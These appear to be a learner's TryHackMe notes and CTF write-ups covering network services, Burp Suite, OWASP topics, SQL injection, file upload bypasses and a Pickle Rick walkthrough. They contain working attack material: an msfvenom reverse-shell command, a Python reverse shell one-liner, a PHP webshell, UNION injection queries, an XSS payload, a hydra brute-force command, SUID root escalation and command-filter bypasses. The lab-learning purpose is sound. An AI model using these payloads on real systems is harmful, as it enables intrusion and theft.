Try hack me notes 

Network services room

SMB -  SERVER MESSAGE BLOCK PROTOCOL -> a client-server communication protocol used for sharing access to files, printers,serial ports, and other resources on a network.

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

Once everything is connected SMB allows one to do anything u can with a file system over the network. which is good for shared drives. SMB runs on windows 95 and SAMBA (UNIX)

using smbclient //[ip]/[share] i was able to connect into the share and grab the RSA KEY. i was also able to look at info in the share. Enum4linux is a great tool for enumerating smb shares. This helped in finding a share to log into.


What is Telnet?

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Replacement

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.
 
How does Telnet work?

The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"

in this exercise we had to exploit a telnet backdoor that we had to exploit using a reverse shell.
using sudo tcpdump ip proto \\icmp -i ens5 and ping [local THM ip] -c 1 to listen for pings we found out that you can run commands through the backdoor so we generated a payload for a reverse shell. msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R this is the command tto generate the shell and with using nc -lvp 4444 this listened for the payload to be activated which gave us remote access into the machine.


What is FTP?

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

How does FTP work?

A typical FTP session operates using two channels:
a command (sometimes called the control) channel
a data channel.
As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 
This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

EASY CTF
----------------------------------------------------------------------
Network services 2
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

How does NFS work?

Shared File

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

 The file handle
 The name of the file to be accessed
 The user's, user ID
 The user's group ID
These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

What runs NFS?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

sudo mount -t nfs IP:share /tmp/mount/ -nolock

Let's break this down

Tag	Function
sudo	Run as root
mount	Execute the mount command
-t nfs	Type of device to mount, then specifying that it's NFS
IP:share	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock	Specifies not to use NLM locking

For this we made a temp folder by doing mkdir /tmp/mount and connected it to a NFS share through that share we entered someones home directory and grabbed their rsa key in the .ssh folder. after using chmod 600 to make it our own key we used it as a way to log back into the directory and abused the SUID bit set permission on our bash executable to gain root access. using scp we downloaded our bash file and after making us the owner and changing the permission to add SUID we ran it with ./bash -p and gained root access.

What is SMTP?

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

 It verifies who is sending emails through the SMTP server.
 It sends the outgoing mail
 If the outgoing mail can't be delivered it sends the message back to the sender
Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.
POP and IMAP

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

How does SMTP work?

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.
We can map the journey of an email from your computer to the recipient’s like this:



1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.

6. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

https://computer.howstuffworks.com/e-mail-messaging/email3.htm

What runs SMTP?

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

More Information:

Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.

https://www.afternerd.com/blog/smtp/

for the smtp server we used Metasploit to find modules and gain information on how to attack the process. msfconsole is how you start meta and using the commands found in help we figured the user name and the version of smtp to run our hydra brute force exploit. "hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.33.249 ssh"
this was our command to find the password (-t 16 are the number of parallel connections to the target)

What is MySQL?

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

Database:

A database is simply a persistent, organised collection of structured data

RDBMS:

A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

SQL:

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.

How does MySQL work?

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:

MySQL creates a database for storing and manipulating data, defining the relationship of each table.
Clients make requests by making specific statements in SQL.
The server will respond to the client with whatever information has been requested.
What runs MySQL?

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

More Information:

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 

https://www.w3schools.com/php/php_mysql_intro.asp

for this we got the port using nmap (3306) and connected with our given user and password using
MySQL -h IP -u root -p after this we used Metasploit to gain more information on the database. after we got a hashdump we gained the hash of another user on the database. we saved the hash to a file nad used john the ripper to crack it. after doing that we logged into his shell using ssh.

-------------------------------------------------------------------------------------------------

Although Burp Suite Community offers a more limited feature set compared to the Professional edition, it still provides an impressive array of tools that are highly valuable for web application testing. Let's explore some of the key features:

Proxy: The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications.

Repeater: Another well-known feature. Repeater allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g., in SQLi - Structured Query Language Injection) or testing the functionality of an endpoint for vulnerabilities.

Intruder: Despite rate limitations in Burp Suite Community, Intruder allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.

Decoder: Decoder offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient.

Comparer: As the name suggests, Comparer enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.

Sequencer: Sequencer is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.


Beyond the built-in features, the Java codebase of Burp Suite facilitates the development of extensions to enhance the framework's functionality. These extensions can be written in Java, Python (using the Java Jython interpreter), or Ruby (using the Java JRuby interpreter). The Burp Suite Extender module allows for quick and easy loading of extensions into the framework, while the marketplace, known as the BApp Store, enables downloading of third-party modules. While certain extensions may require a professional license for integration, there are still a considerable number of extensions available for Burp Community. For instance, the Logger++ module can extend the built-in logging functionality of Burp Suite.
-----------------------------------------------------------------------------------------------


This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.

Broken Access Control - Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.

Cryptographic Failures - A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.

Injection - Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include: SQL injection and command injection like xxs. To Defend against this you would use an allow list on the inputs that can be entered by the user and a stripping input that removes dangerous inputs before they are processes.

Insecure Design - refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start.

Security Misconfiguration - Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable. Some websites have an open debug console that you can use to run code "import os; print(os.popen("ls -l").read())" python code that does Linux commands.

Vulnerable and Outdated Components - Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability. Look on WPScan and Exploit-DB.
 
Identification and Authentication Failures
Software and Data Integrity Failures
Security Logging & Monitoring Failures
Server-Side Request Forgery (SSRF)


----------------------------------------------------------------------------------------------------------

SQL INJECTION NOTES you can use burp suite to do SQL injections thru a website. a website accidently gave us this code Invalid statement: 
        <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code> this means that we can attack it using sql and it also gave us the table (people) and 5 columns. 

/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"

this code helps us find  the columns and where we need to attack.

0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1

this gave us our flag.
----------------------------------------------------------------------------------------------------

OWASP JUICE SHOP NOTES 
To get around this, we will use a character bypass called "Poison Null Byte". A Poison Null Byte looks like this: %00. 

Note: as we can download it using the url, we will need to encode this into a url encoded format.

The Poison Null Byte will now look like this: %2500. Adding this and then a .md to the end will bypass the 403 error!

A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. 

There are three major types of XSS attacks:

DOM (Special)
DOM XSS - (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
Persistent (Server-side)

Persistent XSS - is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. 
Reflected (Client-side)

Reflected XSS - is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data. 

<iframe src="javascript:alert(`xss`)"> this is a way to expose XXS in a site


Reverse Shell stuff
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	This is the common web reverse shell replace the IP with the ip of the system you are attacking.
	
	Using a netcat command we can listen in on port 1234 using nc -lvnp 1234 in our terminal to wait for our reverse shell to connect to the system.
	
	Or we could use  a php webshell script by doing this. 
	
	`<?php       echo system($_GET["cmd"]);   ?>` and upload it to our site and click it  to gain a webshell.
	
Up until now we have largely been ignoring the counter-defences employed by web developers to defend against file upload vulnerabilities. Every website that you've successfully attacked so far in this room has been completely insecure. It's time that changed. From here on out, we'll be looking at some of the defence mechanisms used to prevent malicious file uploads, and how to circumvent them.

---

First up, let's discuss the differences between _client_-side filtering and _server_-side filtering.

When we talk about a script being "Client-Side", in the context of web applications, we mean that it's running in the user's browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on _our_ computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.

Conversely, as you may have guessed, a _server_-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft's ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don't have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.

---

With that in mind, let's take a look at some different kinds of filtering.  

_Extension Validation:_

File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we'll cover in a bit. Filters that check for extensions work in one of two ways. They either _blacklist_ extensions (i.e. have a list of extensions which are **not** allowed) or they _whitelist_ extensions (i.e. have a list of extensions which **are** allowed, and reject everything else).

_File Type Filtering:_

Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We'll be looking at two types of file type validation:  

- _MIME validation:_ MIME (**M**ultipurpose **I**nternet **M**ail **E**xtension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:  
    ![](https://i.imgur.com/uptWRKW.png)  
      
    MIME types follow the format <type>/<subtype>. In the request above, you can see that the image "spaniel.jpg" was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was "image/jpeg". The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.  
      
    
- _Magic Number validation**:**_ Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: `89 50 4E 47 0D 0A 1A 0A`.  
    ![](https://i.imgur.com/vHQWOgi.png)  
    Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it's more effective than checking the extension of a file.

_File Length Filtering:_

File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.

_File Name Filtering:_

As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don't contain any "bad characters", which could potentially cause problems on the file system when uploaded (e.g. null bytes or forward slashes on Linux, as well as control characters such as `;` and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.

_File Content Filtering:_

More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ, and thus will not be covered in this room.

---

It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.

Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious `.php` file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it. These are things that you are welcome to research further, should you be interested.




Hacking web notes


gobuster dir -u http://magic.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
This gobuster command should get the directories for me
Client side filters are easy to bypass just go on burp
reclick and go under > do intercept and get the response from the server. 

From there we can delete the cilent side filter forward the response and upload our file without the filter.

Server side filters are different tho
The example in THM was a file extension checker and would block any files with .php in it. 
The way to exploit it was to change the file to .php5 or .phar to bypass the filter. 


	Magic numbers bypass is done by using a hexeditor to edit the first five byte of our php script to change it to a Gif file 

https://en.wikipedia.org/wiki/List_of_file_signatures


For this Challenge we had to use a different reverse shell becasuse this was a node.js website with a server filter AND a client side filter all in JS. 
Using ctrl f5 let clear our caches which let us intercept the upload.js file and modify the response


https://youtu.be/8UPXibv_s1A This video pretty much sums up all of the stuff we did in that room but heres a quick summary. 
We notice that the site is ran off of node.js so we which our reverse shell to a node.js script. To find Using this gobuster command: gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
we were able to find a few directories int he website. 
We found /content, /admin, /assets, and /modules. All of these are important except for assets
After we find that we look at the page source and notice that the website only accepts jpeg files.  

![Screenshot 2024-10-07 173908](https://github.com/user-attachments/assets/ab9a764c-9e78-4267-8ac2-ca09823f7f9d)

If you use inspect element you can see that the background image is stored in the content dir as /content/LOL.jpg this shows where our .jpg files are stored and which this comess our next gobuster command that takes and list out the jpg files in the content directory 

gobuster dir -u http://jewel.uploadvulns.thm/content -w wrd -x jpg
This command searched for .jpg files in the content directory using the wordlist giving to us by THM. the -x switch helped us filter out the folder by file extentsion.

After that we had to delete the client side filter which we did using burp suite 
To find the filter we had to disable our filter on .js files within burpsuite and then also use ctrl f5 to clear our cache when reloading the site. This let our burp suite intercept the upload.js file while we then intercepted the response and deleted the cilent side filters. 


![Screenshot 2024-10-07 174508](https://github.com/user-attachments/assets/e72697b1-16e4-4018-a93d-26ebb6915e9d)


After we deleted the client side filters we still had the server side filter which was MIME filter. It only let files with the .jpg extenstion in the server so after you change the extension using mv "file name" you would just upload the file as a .jpeg file. 

The last step was to upload it and find it using our gobuster command and then use the admin page to activate our file. since the directory was modules we had to go back to access the content directory so the command ../content/AOJ.jpg activated our file and our listener which allowed to gain webshell access. we then had to go back a directory and gain our flag.

Nmap notes

To get the standard ports and run all the scripts and checks on them: nmap -n -v -sT -A <IP>

To do a full TCP scan: nmap -n -v -sT -p- -T5 <IP>

Then I'll usually run the first one again with -p <any additional ports found>

Then I'll run a "--script vuln" on all the found ports to do an NSE vulnerability scan.

Then if I want to do a UDP scan: nmap -n -v -sU <IP> nmap -n -v -sU -p- -T5 <IP>

Pickle rick CTF

So when we started we did a normal nmap scan to find that port 80 was open and port 22 (ssh) was open

$ gobuster dir -u http://10.10.242.4/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py

Running this command helped us find the /robots.txt/ directory /assets/ /login.php/ portal.php/

In robots.txt we find a single string Wabbalubbadubdub 

We used this as our password for the portal.php login

The user was found by viewing the page source of the main page.

After we logged in we found a tab called commands where we could run linux commands like ls and other commands.

Here is where we found our first flag which we opened by using grep . "File" which was mr. meeseeks hair

after finding our first flag we went for a python3 reverse shell using this payload python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Of course we adjusted the ip address and used nc -lvnp to listen on post 1234. After running the command we gained shell access and realized that root had no password. 

After going to the /root/ folder we found our 3rd flag which was fleeb juice.

After gaining root we went back to /home/ to find the rick directory where we found our last flag.

The flag was 1 jerry tear.


if a site has a filter to disable certain linux commands from being executed you can use these to bypass it
grep . "file" This outputs any character so its a basically a another use of CAT.

while read line; do echo $line; done < "file"
echo < "file"

Grep -R . in the case of this ctf can be used to print out the entire website page.

cat *  cats out everything in a directory

